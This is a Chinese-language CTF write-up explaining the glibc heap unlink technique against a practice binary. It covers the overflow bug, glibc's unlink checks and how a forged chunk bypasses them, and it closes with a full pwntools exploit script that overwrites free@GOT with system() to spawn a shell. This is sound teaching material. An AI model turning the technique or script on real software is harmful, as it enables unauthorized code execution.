---
layout:     post
title:      "Unlink 原理与利用"
subtitle:   "用一道Pwn题说起"
date:       2018-07-23 12:00:00
author:     "Chris"
catalog: true
tags:
    - Pwn
    - 笔记
 
---


## 0x00 代码分析

1，检查保护

```python
[*] '/home/chris/Pwn/heap-unlink'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
2，使用IDA分析程序流程

**main 函数分析**

```c
void __cdecl main()
{
  int v0;   #[esp+Ch] [ebp-Ch]

  v0 = 0;
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  while ( 1 )
  {
    sub_804858B();
    v0 = -1;
    __isoc99_scanf("%d", &v0);
    switch ( v0 )
    {
      case 1:
        sub_80485F7();
        break;
      case 2:
        sub_804867D();
        break;
      case 3:
        sub_8048702();
        break;
      case 4:
        sub_804876C();
        break;
      case 5:
        exit(0);
        return;
      default:
        continue;
    }
  }
}
```
读入你输入的选项，然后执行对应的函数

**Add 函数分析**

```c
void *sub_80485F7()
{
  void *result;   #eax
  int v1;   #ebx
  size_t size;   #[esp+Ch] [ebp-Ch]

  size = 0;
  if ( dword_8049D88 > 9 )
    return (void *)write(1, "cannot add chunks!", 0x12u);
  write(1, "Input the size of chunk you want to add:", 0x28u);
  __isoc99_scanf("%d", &size);
  result = (void *)size;
  if ( (signed int)size > 0 )
  {
    v1 = dword_8049D88++;
    result = malloc(size);
    buf[v1] = result;
  }
  return result;
}
```
这里分析出来一个指针数组

	  char * buf[n]

**Set 函数分析**

```c
ssize_t sub_804867D()
{
  int v1;   #[esp+Ch] [ebp-Ch]

  v1 = -1;
  write(1, "Set chunk index:", 0x10u);
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 )
    return write(1, "Set chunk data error!\n", 0x16u);
  write(1, "Set chunk data:", 0xFu);
  return read(0, buf[v1], 0x400u);
}
```
设置add的堆空间内容

**Delete 函数分析**

```c
void sub_8048702()
{
  int v0;   #[esp+Ch] [ebp-Ch]

  v0 = -1;
  write(1, "Delete chunk index:", 0x13u);
  __isoc99_scanf("%d", &v0);
  if ( v0 >= 0 )
    free(buf[v0]);
  else
    write(1, "Delete chunk error!\n", 0x14u);
}
```
free后指针未置零

**Print 函数分析**

```c
ssize_t sub_804876C()
{
  ssize_t result;   #eax
  int v1;   #[esp+Ch] [ebp-Ch]

  v1 = -1;
  write(1, "Print chunk index:", 0x12u);
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 )
    result = write(1, buf[v1], 0x100u);
  else
    result = write(1, "Print chunk error!\n", 0x13u);
  return result;
}
```
该函数的功能就是输出buf[ ]指向内存区域的内容。

## 0x01 漏洞分析

add函数，程序malloc分配的堆空间在内存中是连续的，但是在Set函数设置堆空间内容时没有限制长度，导致溢出，这里我们使用unlink拿shell。

<span id="unlink"></span>
## 0x02 unlink介绍

一旦涉及到free内存，那么就意味着有新的chunk由allocated状态变成了free状态，此时glibc malloc就需要进行合并操作——向前以及(或)向后合并。这里所谓向前向后的概念如下：将previous free chunk合并到当前free chunk，叫做向后合并；将后面的free chunk合并到当前free chunk，叫做向前合并。


完整的unlink宏如下

```c
define unlink(AV, P, BK, FD) {                                            
    FD = P->fd;                     
    BK = P->bk;                 
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))//malloc中新增加的防止double free的判断
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {                                    
        FD->bk = BK;                    
        BK->fd = FD;                    
        if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) {
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
          malloc_printerr (check_action,"corrupted double-linked list (not small)",P, AV);
            if (FD->fd_nextsize == NULL) {
                if (P->fd_nextsize == P)    
                  FD->fd_nextsize = FD->bk_nextsize = FD;
                else {                      
                    FD->fd_nextsize = P->fd_nextsize;
                    FD->bk_nextsize = P->bk_nextsize;
                    P->fd_nextsize->bk_nextsize = FD;
                    P->bk_nextsize->fd_nextsize = FD;
                  }                           
              } else {                      
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;
              }                                  
          }                                   
      }                         
}

```

最简单版本unlink宏如下

```c
/* Take a chunk off a bin list */
define unlink(P, BK, FD) {                                           
  FD = P->fd;                                                          
  BK = P->bk;                                                          
  FD->bk = BK;                                                         
  BK->fd = FD;                                                         
}
```

一、向后合并：

相关代码如下：

```c
    /*malloc.c  int_free函数中*/
/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/
/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p->prev_size;
size += prevsize;
  #修改指向当前chunk的指针，指向前一个chunk。
      p = chunk_at_offset(p, -((long) prevsize)); 
      unlink(p, bck, fwd);
}   

```

首先检测前一个chunk是否为free，这可以通过检测当前free chunk的PREV_INUSE(P)比特位知晓。在本例中，当前chunk（first chunk）的前一个chunk是allocated的，因为在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。

如果为free的话，那么就进行向后合并：

1)将前一个chunk占用的内存合并到当前chunk;
2)修改指向当前chunk的指针，改为指向前一个chunk。
3)使用unlink宏，将前一个free chunk从双向循环链表中移除(这里最好自己画图理解，学过数据结构的应该都没问题)。

在本例中由于前一个chunk是allocated的，所以并不会进行向后合并操作。

二、向前合并操作：

首先检测next chunk是否为free。那么如何检测呢？很简单，查询next chunk之后的chunk的 PREV_INUSE (P)即可。相关代码如下：

```c
……
/*这里p指向当前chunk*/
nextchunk = chunk_at_offset(p, size);
……
nextsize = chunksize(nextchunk);
……
if (nextchunk != av->top) { 
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  #判断nextchunk是否为free chunk
      /* consolidate forward */
      if (!nextinuse) {   #next chunk为free chunk
            unlink(nextchunk, bck, fwd);   #将nextchunk从链表中移除
          size += nextsize;   #p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
      } else
            clear_inuse_bit_at_offset(nextchunk, 0);    

      ……
    }
```
整个操作与”向后合并“操作类似，再通过上述代码结合注释应该很容易理解free chunk的向前结合操作。在本例中当前chunk为first，它的下一个chunk为second，再下一个chunk为top chunk，此时 top chunk的 PREV_INUSE位是设置为1的(表示top chunk的前一个chunk，即second chunk, 已经使用)，因此first的下一个chunk不会被“向前合并“掉。

介绍完向前、向后合并操作，下面就需要了解执行free（）合并后或者**因为不满足合并条件而没合并**的chunk该如何进一步处理了。在glibc malloc中，会将合并后的chunk放到unsorted bin中(还记得unsorted bin的含义么？)。相关代码如下：

```c
/*
 Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.
*/  

bck = unsorted_chunks(av);   #获取unsorted bin的第一个chunk
/*
  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
    #define unsorted_chunks(M)          (bin_at (M, 1))
*/
      fwd = bck->fd;
      ……
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;  

      set_head(p, size | PREV_INUSE);  #设置当前chunk的size,并将前一个chunk标记为已使用
set_foot(p, size);  #将后一个chunk的prev_size设置为当前chunk的size
/*
   /* Set size/use field */
   #define set_head(p, s)       ((p)->size = (s))
   /* Set size at footer (only when chunk is not in use) */
   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))
*/
```
上述代码完成的整个过程简要概括如下：将当前chunk插入到unsorted bin的第一个chunk(第一个chunk是链表的头结点，为空)与第二个chunk之间(真正意义上的第一个可用chunk)；然后通过设置自己的size字段将前一个chunk标记为已使用；再更改后一个chunk的prev_size字段，将其设置为当前chunk的size；然后更改后一个chunk的size字段的p位，将其设置为0，表示前一个chunk为空闲。

注意：上一段中描述的”前一个“与”后一个“chunk，是指的由chunk的prev_size与size字段隐式连接的chunk，即它们在内存中是连续、相邻的！而不是通过chunk中的fd与bk字段组成的bin(双向链表)中的前一个与后一个chunk，切记！。

三、Unlink部分安全检测机制

>size大小检测

```c
      #判断nextsize的大小是否是一个正常的值，如果我们fake glibc时将size改成了很大的数，期望达到相应的效果,在nextsize的检测中就会出错
     if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
    || __builtin_expect (nextsize >= av->system_mem, 0))
      {//如果nextsize小于最小的chunk大小，或者大于了整个分配区的内存总量，报错
errstr = "free(): invalid next size (normal)";
goto errout;
      }

  #由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size"); 
```
>双链表冲突检测

```c
  #该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```
>Double Free检测

```c
/* Lightweight tests: check whether the block is already the top block*/
//判断当前free的chunk是否是top chunk，因为top chunk本身就是一个空闲的chunk，如果是top chunk,造成 double free
if (__glibc_unlikely (p == av->top)){
    errstr = "double free or corruption (top)";
    goto errout;
}
/* Or whether the next chunk is beyond the boundaries of the arena.  */
if (__builtin_expect (contiguous (av)//不是通过mmap分配的，是通过sbrk()分配的
    && (char *) nextchunk   //下一个chunk的地址如果已经超过了top chunk的结束地址，报错
    >= ((char *) av->top + chunksize(av->top)), 0)){
    errstr = "double free or corruption (out)";
    goto errout;
 }
/* Or whether the block is actually not marked used.  */
if (__glibc_unlikely (!prev_inuse(nextchunk))){//如果下一个chunk没有标示将要释放的这个chunk 的p位为0，说明chunk 可能被double free
    errstr = "double free or corruption (!prev)";
    goto errout;
}

```

## 0x03 漏洞利用

这里把利用过程分为7个步骤：

* 新建chunk 0 1 2 和 3，大小80（申请size/4=偶数 避免chunk空间复用，且fastbin释放不会有unlink）,并设置chunk 3数据为“/bin/sh”（为什么不设置chunk 2?因为在后面add数据的时候chunk 2地址会被输入的回车符‘0xA’破坏）
* 设置chunk 0数据，伪造fake_chunk
* free(chunk[1])，触发unlink
* 设置chunk 0数据，修改chunk[1]为address
* DynELF反复leak出目标主机system函数地址
* 修改*（free@got）为system函数地址
* 释放chunk 3，触发system(“/bin/sh”)


#### 新建chunk 0 1 2 3

栈空间如图()：

![pic1]


#### 设置chunk 0数据，伪造fake_chunk

如图：

	chunk0                malloc返回的ptr0           chunk1        malloc返回的ptr1
	|                     |                        |             |
	+-----------+---------+----+----+----+----+----+------+------+----+----+------+
	|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |
	|           |         |prev|size| fd | bk | A  | prev | size&|    |    |      |
	| prev_size |size&Flag|size|    |    |    | T  | size | flag |    |    |      |
	|           |         |    |    |    |    | A  |      |      |    |    |      |
	|           |         |    |    |    |    |    |      |      |    |    |      |
	+-----------+---------+----+----+----+----+----+------+------+----+----+------+

我们在malloc返回的ptr0（chunk 0）开始地方构造的数据：


	p32(0) + p32(81) + p32(&chunk0-12) + p32(&chunk0-8) + "A"*(80-4*4) + p32(80) + p32(88)

这样的话将chunk 0的mem空间伪造成一个fake_chunk，其中fake_fd=p32(&chunk0-12) ， fake_bk=p32(&chunk0-8) 这样做的话执行unlink操作时

```c
FD=P->fd = &chunk0-12 ，
BK=P->bk = &chunk0-8 ，
FD->bk ，即 *(&chunk0-12+12) = *(&chunk0) = buf[0] = chunk 0 = p 
BK->fd ，即*(&chunk0-8+8) = *(&chunk0) = buf[0] = chunk 0 = p
```
这样就绕过了双向链表检查。

```c
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             
      malloc_printerr (check_action, "corrupted double-linked list", P);
```
接下来绕过前后size检查，这个就很简单，只需将chunk 1的fake_prev_size覆盖为ptr0当前mem空间大小即80，并且fake_chunk的fake_size大小必须为ptr0当前mem空间大小加上p标志位=81.

覆盖chunk 1的fake_size&flag要正确，为偶数代表前一个chunk为空可合并，大小满足原本chunk大小，这样可以避免错误的size大小以致double free报错.

#### free(chunk[1])，触发unlink

由于在 chunk 1 前面构造了一个伪造的空闲内存块，当free(chunk[1])时，就会对伪造的空闲内存块进行unlink操作：

```c
F = p -> fd;    #F = &chunk0 - 12
B = p -> bk;    #B = &chunk0- 8
if (F -> bk == p && B -> fd == p){
  F -> bk = B;    #即buf[0] = B = &chunk0 - 8
  B -> fd = F;    #即buf[0] = F = &chunk0 -12
}
```
从上可知，unlink后，buf[0]存的不再是chunk 0 的起始地址了，而是&chunk0 - 12 即 &buf-12。此时我们只关心buf数组的内存，其布局如下：

![pic2]

#### Leaking

这样我们可以通过`set_chunk（0，data = "A" * 12 + p32(&buf-12) + p32(addr)）`保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址

万事俱备，只欠东风~

我们只需要重新调用set_chunk（0，data....），将chunk 1的地址覆盖为free()got.plt,这样当我们使用set_chunk(1,system_addr)便将system函数地址写进了free函数的got表，然后调用free（chunk 3）[chunk 3里面装有/bin/sh]，启动shell。

## 0x04 完整脚本

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

p = process("./heap-unlink")

start = 0x8049d60 #start=&chunk0
free_got = 0x8049ce8

flag = 0
def leak(addr):
    data = "A" * 0xc + p32(start-0xc) + p32(addr)
    global flag
    if flag == 0:
        set_chunk(0, data)
        flag = 1
    else:
        set_chunk2(0, data)
    data = ""
    p.recvuntil('5.Exit\n')
    data = print_chunk(1)
    print("leaking: %#x ---> %s" % (addr, data[0:4].encode('hex')))
    return data[0:4]

def add_chunk(len):
    print p.recvuntil('\n')
    p.sendline('1')
    print p.recvuntil('Input the size of chunk you want to add:')
    p.sendline(str(len))

def set_chunk(index,data):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def set_chunk2(index, data):
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def del_chunk(index):
    p.recvuntil('\n')
    p.sendline('3')
    p.recvuntil('Delete chunk index:')
    p.sendline(str(index))

def print_chunk(index):
    p.sendline('4')
    p.recvuntil('Print chunk index:')
    p.sendline(str(index))
    res = p.recvuntil('5.Exit\n')
    return res

add_chunk(80)  #0
add_chunk(80)  #1
add_chunk(80)  #2
add_chunk(80)  #3
set_chunk(3, '/bin/sh')

#fake_chunk
payload = ""
payload += p32(0) + p32(81) + p32(start-12) + p32(start-8)
payload += "A"*(80-4*4)
payload += p32(80) + p32(88)

set_chunk(0,payload)

del_chunk(1)

#leak system_addr
pwn_elf = ELF('./heap-unlink')
d = DynELF(leak, elf=pwn_elf)
sys_addr = d.lookup('system', 'libc')
print("system addr: %#x" % sys_addr)

data = "A" * 12 + p32(start-12) + p32(free_got)
set_chunk2('0', data)

set_chunk2('1', p32(sys_addr))

del_chunk('3')
p.interactive()
p.close()
```
## 0x05 总结

程序中存在堆溢出且长度可观时，很容易构造出unlink；但是当程序没有长度溢出，或者堆大小固定时，我们可以构造chunk错位（伪造）的方式来构造unlink的空闲chunk；还有就是利用合并后被放入unsortedbin中的chunk，利用UAF
，对合并前的堆块进行构造。详细见[2018强网杯silent2](https://bbs.pediy.com/thread-247020.htm)和[网鼎杯Pwn之babyheap](https://sirhc.xyz/2018/09/02/%E7%BD%91%E9%BC%8E%E6%9D%AFPwn%E4%B9%8Bbabyheap/)

>[文件下载](https://github.com/yxshyj/project/tree/master/pwn/heap-unlink)

## 0x06 参考资料

>[Linux堆溢出漏洞利用之unlink – 阿里移动安全](http://www.vuln.cn/6327)


[pic2]:data:image/png;base64,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